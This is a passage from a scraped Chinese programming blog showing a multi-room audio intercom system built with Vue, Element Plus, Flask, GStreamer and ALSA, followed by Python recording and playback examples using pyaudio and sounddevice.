href=\u0026#34;https://unpkg.com/element-plus/dist/index.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;style\u0026gt; body { padding: 20px; background: #f5f7fa; } #app { max-width: 700px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px #ccc; } h2 { margin-bottom: 20px; } .volume-slider { width: 300px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;对讲 \u0026amp; 广播 控制面板\u0026lt;/h2\u0026gt; \u0026lt;el-form label-width=\u0026#34;120px\u0026#34;\u0026gt; \u0026lt;el-form-item label=\u0026#34;录音设备\u0026#34;\u0026gt; \u0026lt;el-select v-model=\u0026#34;selectedInputId\u0026#34; placeholder=\u0026#34;请选择录音设备\u0026#34;\u0026gt; \u0026lt;el-option v-for=\u0026#34;item in inputs\u0026#34; :key=\u0026#34;item.id\u0026#34; :label=\u0026#34;item.name\u0026#34; :value=\u0026#34;item.id\u0026#34;\u0026gt; \u0026lt;/el-option\u0026gt; \u0026lt;/el-select\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item label=\u0026#34;输出设备\u0026#34;\u0026gt; \u0026lt;el-select v-model=\u0026#34;selectedOutputId\u0026#34; placeholder=\u0026#34;请选择输出设备\u0026#34;\u0026gt; \u0026lt;el-option v-for=\u0026#34;item in outputs\u0026#34; :key=\u0026#34;item.id\u0026#34; :label=\u0026#34;item.name\u0026#34; :value=\u0026#34;item.id\u0026#34;\u0026gt; \u0026lt;/el-option\u0026gt; \u0026lt;/el-select\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item label=\u0026#34;广播设备 (可多选)\u0026#34;\u0026gt; \u0026lt;el-select v-model=\u0026#34;selectedBroadcastIds\u0026#34; multiple placeholder=\u0026#34;可选择多个广播设备\u0026#34;\u0026gt; \u0026lt;el-option v-for=\u0026#34;item in outputs\u0026#34; :key=\u0026#34;item.id\u0026#34; :label=\u0026#34;item.name\u0026#34; :value=\u0026#34;item.id\u0026#34;\u0026gt; \u0026lt;/el-option\u0026gt; \u0026lt;/el-select\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item label=\u0026#34;输入音量\u0026#34;\u0026gt; \u0026lt;el-slider v-model=\u0026#34;inputVolume\u0026#34; :min=\u0026#34;0\u0026#34; :max=\u0026#34;2\u0026#34; :step=\u0026#34;0.01\u0026#34; class=\u0026#34;volume-slider\u0026#34; show-tooltip :format-tooltip=\u0026#34;val =\u0026gt; (val*100).toFixed(0) + \u0026#39;%\u0026#39;\u0026#34;\u0026gt;\u0026lt;/el-slider\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item label=\u0026#34;输出音量\u0026#34;\u0026gt; \u0026lt;el-slider v-model=\u0026#34;outputVolume\u0026#34; :min=\u0026#34;0\u0026#34; :max=\u0026#34;2\u0026#34; :step=\u0026#34;0.01\u0026#34; class=\u0026#34;volume-slider\u0026#34; show-tooltip :format-tooltip=\u0026#34;val =\u0026gt; (val*100).toFixed(0) + \u0026#39;%\u0026#39;\u0026#34;\u0026gt;\u0026lt;/el-slider\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item label=\u0026#34;广播音量\u0026#34;\u0026gt; \u0026lt;el-slider v-model=\u0026#34;broadcastVolume\u0026#34; :min=\u0026#34;0\u0026#34; :max=\u0026#34;2\u0026#34; :step=\u0026#34;0.01\u0026#34; class=\u0026#34;volume-slider\u0026#34; show-tooltip :format-tooltip=\u0026#34;val =\u0026gt; (val*100).toFixed(0) + \u0026#39;%\u0026#39;\u0026#34;\u0026gt;\u0026lt;/el-slider\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item\u0026gt; \u0026lt;el-button type=\u0026#34;primary\u0026#34; @click=\u0026#34;startTalk\u0026#34; :disabled=\u0026#34;running\u0026#34;\u0026gt;开始\u0026lt;/el-button\u0026gt; \u0026lt;el-button @click=\u0026#34;stopTalk\u0026#34; :disabled=\u0026#34;!running\u0026#34;\u0026gt;停止\u0026lt;/el-button\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;/el-form\u0026gt; \u0026lt;div v-if=\u0026#34;running\u0026#34; style=\u0026#34;color: green; margin-top: 20px;\u0026#34;\u0026gt;正在对讲中...\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/vue@3/dist/vue.global.prod.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/element-plus\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; const { createApp, computed } = Vue const { ElMessage } = ElementPlus createApp({ data() { return { inputs: [], outputs: [], selectedInputId: \u0026#39;\u0026#39;, selectedOutputId: \u0026#39;\u0026#39;, selectedBroadcastIds: [], inputVolume: 1.0, outputVolume: 1.0, broadcastVolume: 1.0, running: false, } }, computed: { inputMap() { const map = {} this.inputs.forEach(dev =\u0026gt; map[dev.id] = dev) return map }, outputMap() { const map = {} this.outputs.forEach(dev =\u0026gt; map[dev.id] = dev) return map }, selectedInput() { return this.inputMap[this.selectedInputId] }, selectedOutput() { return this.outputMap[this.selectedOutputId] }, selectedBroadcasts() { return this.selectedBroadcastIds.map(id =\u0026gt; this.outputMap[id]) } }, mounted() { this.loadDevices() this.checkStatus() }, methods: { async loadDevices() { try { const res = await fetch(\u0026#39;/api/devices\u0026#39;) const data = await res.json() this.inputs = data.inputs.map(dev =\u0026gt; ({ ...dev, id: `in-${dev.card}-${dev.device}`, name: `${dev.name} (hw:${dev.card},${dev.device})` })) this.outputs = data.outputs.map(dev =\u0026gt; ({ ...dev, id: `out-${dev.card}-${dev.device}`, name: `${dev.name} (hw:${dev.card},${dev.device})` })) if (this.inputs.length) this.selectedInputId = this.inputs[0].id if (this.outputs.length) this.selectedOutputId = this.outputs[0].id } catch (e) { ElMessage.error(\u0026#39;加载设备失败: \u0026#39; + e) } }, async startTalk() { if (!this.selectedInput || !this.selectedOutput) { ElMessage.warning(\u0026#39;请选择输入和输出设备\u0026#39;) return } const res = await fetch(\u0026#39;/api/start\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify({ input: this.selectedInput, output: this.selectedOutput, broadcasts: this.selectedBroadcasts, input_volume: this.inputVolume, output_volume: this.outputVolume, broadcast_volume: this.broadcastVolume }) }) const data = await res.json() if (data.status === \u0026#39;started\u0026#39; || data.status === \u0026#39;already running\u0026#39;) { this.running = true ElMessage.success(\u0026#39;已开始对讲\u0026#39;) } else { ElMessage.error(\u0026#39;启动失败: \u0026#39; + (data.message || \u0026#39;未知错误\u0026#39;)) } }, async stopTalk() { const res = await fetch(\u0026#39;/api/stop\u0026#39;, { method: \u0026#39;POST\u0026#39; }) const data = await res.json() if (data.status === \u0026#39;stopped\u0026#39;) { this.running = false ElMessage.success(\u0026#39;已停止\u0026#39;) } else { ElMessage.warning(\u0026#39;未在运行\u0026#39;) } }, async checkStatus() { const res = await fetch(\u0026#39;/api/status\u0026#39;) const data = await res.json() this.running = data.running } } }).use(ElementPlus).mount(\u0026#39;#app\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; threading subprocess tasklist from flask import Flask, jsonify, request import subprocess import re import threading import gi gi.require_version(\u0026#39;Gst\u0026#39;, \u0026#39;1.0\u0026#39;) from gi.repository import Gst, GLib Gst.init(None) app = Flask(__name__, static_folder=\u0026#39;frontend\u0026#39;, static_url_path=\u0026#39;/\u0026#39;) def list_alsa_devices(device_type=\u0026#39;playback\u0026#39;): cmd = [\u0026#39;aplay\u0026#39;, \u0026#39;-l\u0026#39;] if device_type == \u0026#39;playback\u0026#39; else [\u0026#39;arecord\u0026#39;, \u0026#39;-l\u0026#39;] try: result = subprocess.run(cmd, capture_output=True, text=True, check=True) output = result.stdout except Exception as e: print(f\u0026#34;Error listing ALSA devices: {e}\u0026#34;) return [] devices = [] regex = re.compile(r\u0026#34;card (\\d+): ([^\\[]+)\\[.*?\\], device (\\d+): ([^\\[]+)\\[.*?\\]\u0026#34;) for line in output.splitlines(): m = regex.search(line) if m: card = int(m.group(1)) card_name = m.group(2).strip() device = int(m.group(3)) device_name = m.group(4).strip() devices.append({ \u0026#34;card\u0026#34;: card, \u0026#34;device\u0026#34;: device, \u0026#34;name\u0026#34;: f\u0026#34;{card_name} {device_name}\u0026#34; }) return devices class TalkManager(threading.Thread): def __init__(self, input_dev, output_dev, broadcast_devs, input_volume=1.0, output_volume=1.0, broadcast_volume=1.0): super().__init__() self.loop = GLib.MainLoop() self.pipeline = None self.running = False self.input_device = input_dev self.output_device = output_dev self.broadcast_devices = broadcast_devs or [] self.input_volume = input_volume self.output_volume = output_volume self.broadcast_volume = broadcast_volume def run(self): self.running = True in_dev_str = f\u0026#34;hw:{self.input_device[\u0026#39;card\u0026#39;]},{self.input_device[\u0026#39;device\u0026#39;]}\u0026#34; out_dev_str = f\u0026#34;hw:{self.output_device[\u0026#39;card\u0026#39;]},{self.output_device[\u0026#39;device\u0026#39;]}\u0026#34; pipeline_str = ( f\u0026#34;alsasrc device={in_dev_str} ! volume volume={self.input_volume} ! audioconvert ! audioresample ! tee name=t \u0026#34; f\u0026#34;t. ! queue ! volume volume={self.output_volume} ! audioconvert ! audioresample ! alsasink device={out_dev_str} \u0026#34; ) for bc_dev in self.broadcast_devices: bc_dev_str = f\u0026#34;hw:{bc_dev[\u0026#39;card\u0026#39;]},{bc_dev[\u0026#39;device\u0026#39;]}\u0026#34; pipeline_str += f\u0026#34; t. ! queue ! volume volume={self.broadcast_volume} ! audioconvert ! audioresample ! alsasink device={bc_dev_str} \u0026#34; print(f\u0026#34;启动管道: {pipeline_str}\u0026#34;) self.pipeline = Gst.parse_launch(pipeline_str) self.pipeline.set_state(Gst.State.PLAYING) try: self.loop.run() except Exception as e: print(f\u0026#34;GStreamer loop exited: {e}\u0026#34;) finally: self.pipeline.set_state(Gst.State.NULL) self.running = False def stop(self): if self.running: self.loop.quit() self.join() self.running = False talk_managers = {} # 多个通道 tm_lock = threading.Lock() next_id = 1 @app.route(\u0026#39;/\u0026#39;) def index(): return app.send_static_file(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/api/devices\u0026#39;) def api_devices(): inputs = list_alsa_devices(\u0026#39;capture\u0026#39;) outputs = list_alsa_devices(\u0026#39;playback\u0026#39;) return jsonify({\u0026#39;inputs\u0026#39;: inputs, \u0026#39;outputs\u0026#39;: outputs}) @app.route(\u0026#39;/api/start\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def api_start(): global next_id data = request.json input_dev = data.get(\u0026#39;input\u0026#39;) output_dev = data.get(\u0026#39;output\u0026#39;) broadcast_devs = data.get(\u0026#39;broadcasts\u0026#39;, []) input_volume = float(data.get(\u0026#39;input_volume\u0026#39;, 1.0)) output_volume = float(data.get(\u0026#39;output_volume\u0026#39;, 1.0)) broadcast_volume = float(data.get(\u0026#39;broadcast_volume\u0026#39;, 1.0)) if not input_dev or not output_dev: return jsonify({\u0026#39;status\u0026#39;: \u0026#39;error\u0026#39;, \u0026#39;message\u0026#39;: \u0026#39;输入或输出设备未选择\u0026#39;}) tm = TalkManager( input_dev=input_dev, output_dev=output_dev, broadcast_devs=broadcast_devs, input_volume=input_volume, output_volume=output_volume, broadcast_volume=broadcast_volume ) with tm_lock: tm_id = next_id next_id += 1 talk_managers[tm_id] = tm tm.start() return jsonify({\u0026#39;status\u0026#39;: \u0026#39;started\u0026#39;, \u0026#39;id\u0026#39;: tm_id}) @app.route(\u0026#39;/api/stop\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def api_stop(): data = request.json tm_id = data.get(\u0026#39;id\u0026#39;) with tm_lock: tm = talk_managers.get(tm_id) if tm and tm.running: tm.stop() del talk_managers[tm_id] return jsonify({\u0026#39;status\u0026#39;: \u0026#39;stopped\u0026#39;}) else: return jsonify({\u0026#39;status\u0026#39;: \u0026#39;not running\u0026#39;}) @app.route(\u0026#39;/api/status\u0026#39;) def api_status(): with tm_lock: active = [] for tm_id, tm in talk_managers.items(): if tm.running: active.append({ \u0026#39;id\u0026#39;: tm_id, \u0026#39;input\u0026#39;: tm.input_device, \u0026#39;output\u0026#39;: tm.output_device }) return jsonify({\u0026#39;active\u0026#39;: active}) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;多房间对讲系统控制面板\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://unpkg.com/element-plus/dist/index.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;style\u0026gt; body { padding: 20px; background: #f5f7fa; } #app { max-width: 900px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px #ccc; } h2 { margin-bottom: 20px; } .volume-slider { width: 300px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;多房间对讲系统\u0026lt;/h2\u0026gt; \u0026lt;el-form label-width=\u0026#34;120px\u0026#34;\u0026gt; \u0026lt;el-form-item label=\u0026#34;录音设备\u0026#34;\u0026gt; \u0026lt;el-select v-model=\u0026#34;selectedInputId\u0026#34; placeholder=\u0026#34;请选择录音设备\u0026#34;\u0026gt; \u0026lt;el-option v-for=\u0026#34;item in inputs\u0026#34; :key=\u0026#34;item.id\u0026#34; :label=\u0026#34;item.name\u0026#34; :value=\u0026#34;item.id\u0026#34;\u0026gt;\u0026lt;/el-option\u0026gt; \u0026lt;/el-select\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item label=\u0026#34;输出设备\u0026#34;\u0026gt; \u0026lt;el-select v-model=\u0026#34;selectedOutputId\u0026#34; placeholder=\u0026#34;请选择输出设备\u0026#34;\u0026gt; \u0026lt;el-option v-for=\u0026#34;item in outputs\u0026#34; :key=\u0026#34;item.id\u0026#34; :label=\u0026#34;item.name\u0026#34; :value=\u0026#34;item.id\u0026#34;\u0026gt;\u0026lt;/el-option\u0026gt; \u0026lt;/el-select\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item label=\u0026#34;广播设备 (可多选)\u0026#34;\u0026gt; \u0026lt;el-select v-model=\u0026#34;selectedBroadcastIds\u0026#34; multiple placeholder=\u0026#34;可选择多个广播设备\u0026#34;\u0026gt; \u0026lt;el-option v-for=\u0026#34;item in outputs\u0026#34; :key=\u0026#34;item.id\u0026#34; :label=\u0026#34;item.name\u0026#34; :value=\u0026#34;item.id\u0026#34;\u0026gt;\u0026lt;/el-option\u0026gt; \u0026lt;/el-select\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item label=\u0026#34;输入音量\u0026#34;\u0026gt; \u0026lt;el-slider v-model=\u0026#34;inputVolume\u0026#34; :min=\u0026#34;0\u0026#34; :max=\u0026#34;2\u0026#34; :step=\u0026#34;0.01\u0026#34; class=\u0026#34;volume-slider\u0026#34; show-tooltip :format-tooltip=\u0026#34;val =\u0026gt; (val*100).toFixed(0) + \u0026#39;%\u0026#39;\u0026#34;\u0026gt;\u0026lt;/el-slider\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item label=\u0026#34;输出音量\u0026#34;\u0026gt; \u0026lt;el-slider v-model=\u0026#34;outputVolume\u0026#34; :min=\u0026#34;0\u0026#34; :max=\u0026#34;2\u0026#34; :step=\u0026#34;0.01\u0026#34; class=\u0026#34;volume-slider\u0026#34; show-tooltip :format-tooltip=\u0026#34;val =\u0026gt; (val*100).toFixed(0) + \u0026#39;%\u0026#39;\u0026#34;\u0026gt;\u0026lt;/el-slider\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item label=\u0026#34;广播音量\u0026#34;\u0026gt; \u0026lt;el-slider v-model=\u0026#34;broadcastVolume\u0026#34; :min=\u0026#34;0\u0026#34; :max=\u0026#34;2\u0026#34; :step=\u0026#34;0.01\u0026#34; class=\u0026#34;volume-slider\u0026#34; show-tooltip :format-tooltip=\u0026#34;val =\u0026gt; (val*100).toFixed(0) + \u0026#39;%\u0026#39;\u0026#34;\u0026gt;\u0026lt;/el-slider\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item\u0026gt; \u0026lt;el-button type=\u0026#34;primary\u0026#34; @click=\u0026#34;startTalk\u0026#34;\u0026gt;开始\u0026lt;/el-button\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;/el-form\u0026gt; \u0026lt;h3 style=\u0026#34;margin-top: 40px;\u0026#34;\u0026gt;当前通话列表\u0026lt;/h3\u0026gt; \u0026lt;el-table :data=\u0026#34;activeTalks\u0026#34; border style=\u0026#34;width: 100%;\u0026#34;\u0026gt; \u0026lt;el-table-column prop=\u0026#34;id\u0026#34; label=\u0026#34;ID\u0026#34; width=\u0026#34;80\u0026#34;\u0026gt;\u0026lt;/el-table-column\u0026gt; \u0026lt;el-table-column label=\u0026#34;输入设备\u0026#34; prop=\u0026#34;input.name\u0026#34;\u0026gt;\u0026lt;/el-table-column\u0026gt; \u0026lt;el-table-column label=\u0026#34;输出设备\u0026#34; prop=\u0026#34;output.name\u0026#34;\u0026gt;\u0026lt;/el-table-column\u0026gt; \u0026lt;el-table-column label=\u0026#34;操作\u0026#34; width=\u0026#34;120\u0026#34;\u0026gt; \u0026lt;template #default=\u0026#34;scope\u0026#34;\u0026gt; \u0026lt;el-button size=\u0026#34;small\u0026#34; @click=\u0026#34;stopTalk(scope.row.id)\u0026#34;\u0026gt;停止\u0026lt;/el-button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/el-table-column\u0026gt; \u0026lt;/el-table\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/vue@3/dist/vue.global.prod.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/element-plus\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; const { createApp } = Vue const { ElMessage } = ElementPlus createApp({ data() { return { inputs: [], outputs: [], selectedInputId: \u0026#39;\u0026#39;, selectedOutputId: \u0026#39;\u0026#39;, selectedBroadcastIds: [], inputVolume: 1.0, outputVolume: 1.0, broadcastVolume: 1.0, activeTalks: [] } }, computed: { inputMap() { const map = {} this.inputs.forEach(dev =\u0026gt; map[dev.id] = dev) return map }, outputMap() { const map = {} this.outputs.forEach(dev =\u0026gt; map[dev.id] = dev) return map }, selectedInput() { return this.inputMap[this.selectedInputId] }, selectedOutput() { return this.outputMap[this.selectedOutputId] }, selectedBroadcasts() { return this.selectedBroadcastIds.map(id =\u0026gt; this.outputMap[id]) } }, mounted() { this.loadDevices() this.loadStatus() setInterval(this.loadStatus, 2000) }, methods: { async loadDevices() { const res = await fetch(\u0026#39;/api/devices\u0026#39;) const data = await res.json() this.inputs = data.inputs.map(dev =\u0026gt; ({ ...dev, id: `in-${dev.card}-${dev.device}`, name: `${dev.name} (hw:${dev.card},${dev.device})` })) this.outputs = data.outputs.map(dev =\u0026gt; ({ ...dev, id: `out-${dev.card}-${dev.device}`, name: `${dev.name} (hw:${dev.card},${dev.device})` })) if (this.inputs.length) this.selectedInputId = this.inputs[0].id if (this.outputs.length) this.selectedOutputId = this.outputs[0].id }, async startTalk() { if (!this.selectedInput || !this.selectedOutput) { ElMessage.warning(\u0026#39;请选择输入和输出设备\u0026#39;) return } const res = await fetch(\u0026#39;/api/start\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify({ input: this.selectedInput, output: this.selectedOutput, broadcasts: this.selectedBroadcasts, input_volume: this.inputVolume, output_volume: this.outputVolume, broadcast_volume: this.broadcastVolume }) }) const data = await res.json() if (data.status === \u0026#39;started\u0026#39;) { ElMessage.success(\u0026#39;已启动对讲\u0026#39;) this.loadStatus() } else { ElMessage.error(\u0026#39;启动失败: \u0026#39; + (data.message || \u0026#39;未知错误\u0026#39;)) } }, async stopTalk(id) { const res = await fetch(\u0026#39;/api/stop\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify({ id }) }) const data = await res.json() if (data.status === \u0026#39;stopped\u0026#39;) { ElMessage.success(\u0026#39;已停止\u0026#39;) this.loadStatus() } else { ElMessage.warning(\u0026#39;未在运行\u0026#39;) } }, async loadStatus() { const res = await fetch(\u0026#39;/api/status\u0026#39;) const data = await res.json() this.activeTalks = data.active } } }).use(ElementPlus).mount(\u0026#39;#app\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ","permalink":"https://qfsyso.github.io/posts/multi-room-intercom-system-alsa-flask-gstreamer/","summary":"多房间对话系统 实现多线程/多输入/多输出\n依赖 sudo apt update sudo apt install python3-pip python3-gi gstreamer1.0-tools \\ gstreamer1.0-plugins-base gstreamer1.0-plugins-good gstreamer1.0-plugins-bad \\ alsa-utils # 新建环境 python3 -m venv myenv # 激活 source myenv/bin/activate pip3 install flask gi err sudo apt update sudo apt install python3-gi python3-gi-cairo gir1.2-gstreamer-1.0 gir1.2-gst-plugins-base-1.0 sudo apt update sudo apt install gstreamer1.0-tools gstreamer1.0-plugins-base \\ gstreamer1.0-plugins-good gstreamer1.0-plugins-bad \\ python3-gi gir1.2-gst-plugins-base-1.0 sudo apt install \\ gstreamer1.0-plugins-base \\ gstreamer1.0-plugins-good \\ gstreamer1.0-plugins-bad \\ gstreamer1.0-plugins-ugly \\ gstreamer1.0-alsa \\ gstreamer1.","title":"Multi-room Intercom System , ALSA Flask GStreamer "},{"content":"Python Audio 依赖：pyaudio（底层调用 PortAudio），安装命令\npip install pyaudio recorder.py\n#!/usr/bin/env python3 \u0026#34;\u0026#34;\u0026#34; 极简录音器 运行：python recorder.py 按提示输入文件名、采样率、通道数、位深、录音时长即可 \u0026#34;\u0026#34;\u0026#34; import pyaudio import wave import sys def record_to_wav(out_file: str, sample_rate: int = 16_000, channels: int = 1, chunk: int = 1_024, record_seconds: int = 5, sample_width: int = 2): \u0026#34;\u0026#34;\u0026#34; 将麦克风输入保存为 WAV 文件 :param out_file: 输出文件名，如 demo.wav :param sample_rate: 采样率（Hz） :param channels: 声道数（1=单声道 2=立体声） :param chunk: 每次读取的帧数 :param record_seconds: 录音时长（秒） :param sample_width: 位深（字节数，2=16bit） \u0026#34;\u0026#34;\u0026#34; p = pyaudio.PyAudio() try: stream = p.open(format=p.get_format_from_width(sample_width), channels=channels, rate=sample_rate, input=True, frames_per_buffer=chunk) print(\u0026#34;开始录音…（Ctrl+C 提前结束）\u0026#34;) frames = [] for _ in range(0, int(sample_rate / chunk * record_seconds)): data = stream.read(chunk, exception_on_overflow=False) frames.append(data) print(\u0026#34;录音结束，正在保存…\u0026#34;) except KeyboardInterrupt: print(\u0026#34;\\n用户中断录音，正在保存…\u0026#34;) finally: stream.stop_stream() stream.close() p.terminate() with wave.open(out_file, \u0026#39;wb\u0026#39;) as wf: wf.setnchannels(channels) wf.setsampwidth(sample_width) wf.setframerate(sample_rate) wf.writeframes(b\u0026#39;\u0026#39;.join(frames)) print(f\u0026#34;已保存为 {out_file}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: try: file_name = input(\u0026#34;输出文件名（*.wav）：\u0026#34;).strip() or \u0026#34;output.wav\u0026#34; sr = int(input(\u0026#34;采样率（Hz，默认16000）：\u0026#34;) or 16000) ch = int(input(\u0026#34;声道数（1/2，默认1）：\u0026#34;) or 1) seconds = int(input(\u0026#34;录音时长（秒，默认5）：\u0026#34;) or 5) except ValueError: print(\u0026#34;输入有误，退出\u0026#34;) sys.exit(1) record_to_wav(file_name, sample_rate=sr, channels=ch, record_seconds=seconds) 运行\npython recorder.py 结果\n输出文件名（*.wav）：ll.wav 采样率（Hz，默认16000）：16000 声道数（1/2，默认1）：1 录音时长（秒，默认5）：5 开始录音…（Ctrl+C 提前结束） 录音结束，正在保存… 已保存为 ll.wav 输入/输出 采集 播放 import pyaudio import numpy as np # 设置采集和播放参数 FORMAT = pyaudio.paInt16 # 使用16-bit PCM CHANNELS = 1 # 单声道 RATE = 44100 # 采样率 CHUNK = 1024 # 每次读取的音频块大小（影响延迟） # 初始化 PyAudio p = pyaudio.PyAudio() # 打开麦克风输入流 input_stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK) # 打开USB喇叭输出流 output_stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True, frames_per_buffer=CHUNK) print(\u0026#34;开始采集并播放音频...\u0026#34;) # 循环采集并播放音频流 try: while True: # 从麦克风采集音频数据 audio_data = input_stream.read(CHUNK) # 播放音频到USB喇叭 output_stream.write(audio_data) except KeyboardInterrupt: print(\u0026#34;\\n停止采集...\u0026#34;) finally: # 停止流和关闭设备 input_stream.stop_stream() input_stream.close() output_stream.stop_stream() output_stream.close() p.terminate() 录音 pip install sounddevice scipy import sounddevice as sd from scipy.io.wavfile import write import numpy as np def list_input_devices(): print(\u0026#34;可用输入设备列表：\u0026#34;) devices = sd.query_devices() for idx, dev in enumerate(devices): if dev[\u0026#39;max_input_channels\u0026#39;] \u0026gt; 0: print(f\u0026#34;{idx}: {dev[\u0026#39;name\u0026#39;]} (默认采样率: {dev[\u0026#39;default_samplerate\u0026#39;]} Hz)\u0026#34;) print() def record_audio(filename=\u0026#39;output.wav\u0026#39;, device_index=None, duration=5): if device_index is None: device_index = sd.default.device[0] # 默认输入设备 # 获取设备信息并自动采样率 dev_info = sd.query_devices(device_index) samplerate = int(dev_info[\u0026#39;default_samplerate\u0026#39;]) print(f\u0026#34;开始录音：{duration}秒，设备：{dev_info[\u0026#39;name\u0026#39;]}，采样率：{samplerate} Hz\u0026#34;) try: recording = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=1, dtype=\u0026#39;int16\u0026#39;, device=device_index) sd.wait() # 等待录音完成 write(filename, samplerate, recording) print(f\u0026#34;录音完成，已保存为 {filename}\u0026#34;) except Exception as e: print(f\u0026#34;录音失败：{e}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: list_input_devices() try: device_index = int(input(\u0026#34;请输入要使用的输入设备编号：\u0026#34;)) filename = input(\u0026#34;请输入保存的文件名（例如 output.wav）：\u0026#34;) duration = float(input(\u0026#34;请输入录音时长（秒）：\u0026#34;)) except Exception as e: print(\u0026#34;输入有误，使用默认配置\u0026#34;) device_index = None filename = \u0026#34;output.wav\u0026#34; duration = 5 record_audio(filename=filename, device_index=device_index, duration=duration) 播放 pip install sounddevice scipy import sounddevice as sd from scipy.io.wavfile import read import os def list_output_devices(): print(\u0026#34;可用播放设备列表（输出设备）：\u0026#34;) devices = sd.query_devices() for idx, dev in enumerate(devices): if dev[\u0026#39;max_output_channels\u0026#39;] \u0026gt; 0: print(f\u0026#34;{idx}: {dev[\u0026#39;name\u0026#39;]} (默认采样率: {dev[\u0026#39;default_samplerate\u0026#39;]} Hz)\u0026#34;) print() def play_wav_on_device(filename, device_index): if not os.path.isfile(filename): print(f\u0026#34;文件不存在: {filename}\u0026#34;) return try: samplerate, data = read(filename) print(f\u0026#34;正在使用设备 \u0026#39;{sd.query_devices(device_index)[\u0026#39;name\u0026#39;]}\u0026#39; 播放 {filename}\u0026#34;) sd.play(data, samplerate=samplerate, device=device_index) sd.wait() # 等待播放结束 print(\u0026#34;播放完成。\u0026#34;) except Exception as e: print(f\u0026#34;播放失败: {e}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: list_output_devices() try: device_index = int(input(\u0026#34;请输入播放设备编号：\u0026#34;)) filename = input(\u0026#34;请输入要播放的 WAV 文件名（如 test.wav）：\u0026#34;).strip() play_wav_on_device(filename, device_index) except Exception as e: print(\u0026#34;输入错误：\u0026#34;, e) 多输入/输出 sudo apt update sudo apt install python3-pip portaudio19-dev pip3 install sounddevice numpy pve 为debian服务器 声卡 麦克风 主机-硬件-添加-添加USB设备-~\narecord -l aplay -l #查看采样率 # 喇叭 A aplay -D hw:1,0 --dump-hw-params /dev/zero # 喇叭 B aplay -D hw:2,0 --dump-hw-params /dev/zero #!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34; talk.py – Debian 下麦克风→喇叭实时转发示例 python3 talk.py \u0026#34;\u0026#34;\u0026#34; import sounddevice as sd import numpy as np import sys import json # ---------- 工具 ---------- def query_devices(): \u0026#34;\u0026#34;\u0026#34;返回 sounddevice 的输入与输出设备列表\u0026#34;\u0026#34;\u0026#34; return sd.query_devices() def list_sample_rates(device_idx): \u0026#34;\u0026#34;\u0026#34;给定设备索引，返回它支持的采样率列表\u0026#34;\u0026#34;\u0026#34; try: caps = sd.query_devices(device_idx) # 实测：对于输入设备，caps[\u0026#39;default_samplerate\u0026#39;] 总是返回一个可用率 # 为了拿到完整列表，我们尝试打开 8000~192000 之间的常用率 rates = [8000, 11025, 16000, 22050, 32000, 